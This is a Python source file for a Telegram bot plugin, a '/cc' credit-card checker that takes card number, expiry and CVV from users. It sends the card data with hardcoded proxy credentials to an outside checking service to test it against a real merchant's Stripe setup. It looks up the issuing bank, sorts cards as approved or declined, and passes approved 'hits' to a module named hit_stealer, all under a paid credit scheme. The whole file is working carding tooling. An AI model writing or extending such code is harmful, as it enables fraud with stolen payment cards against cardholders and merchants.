from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import re, time, requests, httpx, asyncio
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved

session = requests.Session()

@Client.on_message(filters.command("cc", prefixes=["/", "."]))
async def cmd_cc(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = message.chat.type
        username = message.from_user.username or "None"

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply_text("❌ You are not registered. Use /register first.")

        role = (regdata[2] or "FREE").strip().upper()
        credit = int(regdata[5] or 0)

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply_text(
                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this in bot PM.\nJoin group for free use:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
            return await message.reply_text("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.")

        cc_text = message.reply_to_message.text if message.reply_to_message else (
            message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
        )
        if not cc_text:
            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv>")

        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""")

        tic = time.perf_counter()
        proxy_input = "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ"
        site_input = "https://www.tekkabazzar.com"
        kiltes_url = f"https://kiltes.lol/str/?proxy={proxy_input}&site={site_input}&cc={fullcc}"

        async def stripe_check():
            result = ""
            for attempt in range(2):  # Retry max 2 times
                try:
                    async with httpx.AsyncClient(timeout=10) as client:
                        res = await client.get(kiltes_url)
                        if res.status_code == 200:
                            try:
                                data = res.json()
                                result = data.get("result") or data.get("message") or data.get("error") or res.text
                            except:
                                result = res.text
                            break
                        else:
                            result = f"❌ HTTP {res.status_code} — Retrying..."
                except Exception as e:
                    result = f"❌ Request failed: {e} — Retrying..."
                await asyncio.sleep(1)
            return result

        async def bin_lookup():
            try:
                headers = {"User-Agent": "Mozilla/5.0"}
                url = f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}"
                try:
                    binres = session.get(url, headers=headers, timeout=7).json()
                except:
                    proxy = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
                    binres = session.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=10).json()
                return {
                    "brand": binres.get("brand", "N/A").upper(),
                    "type": binres.get("type", "N/A").upper(),
                    "level": binres.get("level", "N/A").upper(),
                    "bank": binres.get("bank", "N/A").upper(),
                    "country": binres.get("country_name", "N/A").upper(),
                    "flag": binres.get("country_flag") or "🏳️"
                }
            except:
                return {"brand": "N/A", "type": "N/A", "level": "N/A", "bank": "N/A", "country": "N/A", "flag": "🏳️"}

        card_message, bin_data = await asyncio.gather(stripe_check(), bin_lookup())
        toc = time.perf_counter()

        msg_lower = card_message.lower()
        status = "Approved ✅" if "payment method added" in msg_lower else "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bin_data['bank']}
<b>⊚ Bin type:</b> {bin_data['brand']} - {bin_data['type']} - {bin_data['level']}
<b>⊙ Country:</b> {bin_data['country']} {bin_data['flag']}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await Client.edit_message_text(chat_id, check_msg.id, text=final_msg)

        if "approved" in status.lower():
            await send_hit_if_approved(Client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
